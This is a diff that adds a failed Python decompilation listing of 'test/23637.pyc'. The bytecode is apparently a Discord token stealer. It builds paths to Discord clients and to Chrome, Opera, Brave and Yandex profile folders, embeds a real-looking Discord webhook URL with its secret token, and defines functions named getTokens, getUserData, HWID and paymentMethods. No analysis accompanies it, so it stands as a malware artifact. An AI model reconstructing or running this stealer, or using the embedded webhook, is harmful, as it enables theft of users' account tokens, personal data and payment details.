@@ -1,0 +1,193 @@
+Instruction context:
+   
+ L. 175       264  DUP_TOP          
+                 266  LOAD_NAME                Exception
+->           268_270  <121>               282  ''
+                 272  POP_TOP          
+                 274  POP_TOP          
+                 276  POP_TOP          
+
+test/23637.pyc -- 
+# decompile failed
+
+# file test/23637.pyc
+# --- This code section failed: ---
+
+ L.   3         0  LOAD_CONST               0
+                2  LOAD_CONST               None
+                4  IMPORT_NAME              os
+                6  STORE_NAME               os
+
+ L.   4         8  LOAD_CONST               0
+               10  LOAD_CONST               ('findall',)
+               12  IMPORT_NAME              re
+               14  IMPORT_FROM              findall
+               16  STORE_NAME               findall
+               18  POP_TOP          
+
+ L.   5        20  LOAD_CONST               0
+               22  LOAD_CONST               ('loads', 'dumps')
+               24  IMPORT_NAME              json
+               26  IMPORT_FROM              loads
+               28  STORE_NAME               loads
+               30  IMPORT_FROM              dumps
+               32  STORE_NAME               dumps
+               34  POP_TOP          
+
+ L.   6        36  LOAD_CONST               0
+               38  LOAD_CONST               ('b64decode',)
+               40  IMPORT_NAME              base64
+               42  IMPORT_FROM              b64decode
+               44  STORE_NAME               b64decode
+               46  POP_TOP          
+
+ L.   7        48  LOAD_CONST               0
+               50  LOAD_CONST               ('Popen', 'PIPE')
+               52  IMPORT_NAME              subprocess
+               54  IMPORT_FROM              Popen
+               56  STORE_NAME               Popen
+               58  IMPORT_FROM              PIPE
+               60  STORE_NAME               PIPE
+               62  POP_TOP          
+
+ L.   8        64  LOAD_CONST               0
+               66  LOAD_CONST               ('Request', 'urlopen')
+               68  IMPORT_NAME_ATTR         urllib.request
+               70  IMPORT_FROM              Request
+               72  STORE_NAME               Request
+               74  IMPORT_FROM              urlopen
+               76  STORE_NAME               urlopen
+               78  POP_TOP          
+
+ L.   9        80  LOAD_CONST               0
+               82  LOAD_CONST               ('Thread',)
+               84  IMPORT_NAME              threading
+               86  IMPORT_FROM              Thread
+               88  STORE_NAME               Thread
+               90  POP_TOP          
+
+ L.  10        92  LOAD_CONST               0
+               94  LOAD_CONST               ('sleep',)
+               96  IMPORT_NAME              time
+               98  IMPORT_FROM              sleep
+              100  STORE_NAME               sleep
+              102  POP_TOP          
+
+ L.  11       104  LOAD_CONST               0
+              106  LOAD_CONST               ('argv',)
+              108  IMPORT_NAME              sys
+              110  IMPORT_FROM              argv
+              112  STORE_NAME               argv
+              114  POP_TOP          
+
+ L.  13       116  LOAD_NAME                os
+              118  LOAD_METHOD              getenv
+              120  LOAD_STR                 'LOCALAPPDATA'
+              122  CALL_METHOD_1         1  ''
+              124  STORE_NAME               LOCAL
+
+ L.  14       126  LOAD_NAME                os
+              128  LOAD_METHOD              getenv
+              130  LOAD_STR                 'APPDATA'
+              132  CALL_METHOD_1         1  ''
+              134  STORE_NAME               ROAMING
+
+ L.  15       136  LOAD_STR                 'https://canary.discord.com/api/webhooks/859934158402879509/ovZd7tdR2hiBbeGWV69-eu01oJTNhJPiwyEXbQwk9vqSZLG8yMDscafwXa_uGfso-EXa'
+              138  STORE_NAME               WEBHOOK_URL
+
+ L.  17       140  LOAD_NAME                ROAMING
+              142  LOAD_STR                 '\\Discord'
+              144  BINARY_ADD       
+
+ L.  18       146  LOAD_NAME                ROAMING
+              148  LOAD_STR                 '\\discordcanary'
+              150  BINARY_ADD       
+
+ L.  19       152  LOAD_NAME                ROAMING
+              154  LOAD_STR                 '\\discordptb'
+              156  BINARY_ADD       
+
+ L.  20       158  LOAD_NAME                ROAMING
+              160  LOAD_STR                 '\\discorddevelopment'
+              162  BINARY_ADD       
+
+ L.  21       164  LOAD_NAME                LOCAL
+              166  LOAD_STR                 '\\Google\\Chrome\\User Data\\Default'
+              168  BINARY_ADD       
+
+ L.  22       170  LOAD_NAME                ROAMING
+              172  LOAD_STR                 '\\Opera Software\\Opera Stable'
+              174  BINARY_ADD       
+
+ L.  23       176  LOAD_NAME                LOCAL
+              178  LOAD_STR                 '\\BraveSoftware\\Brave-Browser\\User Data\\Default'
+              180  BINARY_ADD       
+
+ L.  24       182  LOAD_NAME                LOCAL
+              184  LOAD_STR                 '\\Yandex\\YandexBrowser\\User Data\\Default'
+              186  BINARY_ADD       
+
+ L.  16       188  LOAD_CONST               ('Discord', 'Discord Canary', 'Discord PTB', 'Discord Development', 'Google Chrome', 'Opera', 'Brave', 'Yandex')
+              190  BUILD_CONST_KEY_MAP_8     8 
+              192  STORE_NAME               PATHS
+
+ L.  28       194  LOAD_CONST               (None, 'application/json')
+              196  LOAD_CODE                <code_object getHeader>
+              198  LOAD_STR                 'getHeader'
+              200  MAKE_FUNCTION_1          'default'
+              202  STORE_NAME               getHeader
+
+ L.  38       204  LOAD_CODE                <code_object getUserData>
+              206  LOAD_STR                 'getUserData'
+              208  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              210  STORE_NAME               getUserData
+
+ L.  46       212  LOAD_CODE                <code_object getTokens>
+              214  LOAD_STR                 'getTokens'
+              216  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              218  STORE_NAME               getTokens
+
+ L.  62       220  LOAD_CODE                <code_object whoami>
+              222  LOAD_STR                 'whoami'
+              224  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              226  STORE_NAME               whoami
+
+ L.  71       228  LOAD_CODE                <code_object HWID>
+              230  LOAD_STR                 'HWID'
+              232  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              234  STORE_NAME               HWID
+
+ L.  76       236  LOAD_CODE                <code_object paymentMethods>
+              238  LOAD_STR                 'paymentMethods'
+              240  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              242  STORE_NAME               paymentMethods
+
+ L.  86       244  LOAD_CODE                <code_object main>
+              246  LOAD_STR                 'main'
+              248  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              250  STORE_NAME               main
+
+ L. 173       252  SETUP_FINALLY       264  'to 264'
+
+ L. 174       254  LOAD_NAME                main
+              256  CALL_FUNCTION_0       0  ''
+              258  POP_TOP          
+              260  POP_BLOCK        
+              262  JUMP_FORWARD        284  'to 284'
+            264_0  COME_FROM_FINALLY   252  '252'
+
+ L. 175       264  DUP_TOP          
+              266  LOAD_NAME                Exception
+          268_270  <121>               282  ''
+              272  POP_TOP          
+              274  POP_TOP          
+              276  POP_TOP          
+
+ L. 176       278  POP_EXCEPT       
+              280  JUMP_FORWARD        284  'to 284'
+              282  <48>             
+            284_0  COME_FROM           280  '280'
+            284_1  COME_FROM           262  '262'
+
+Parse error at or near `<121>' instruction at offset 268_270
+
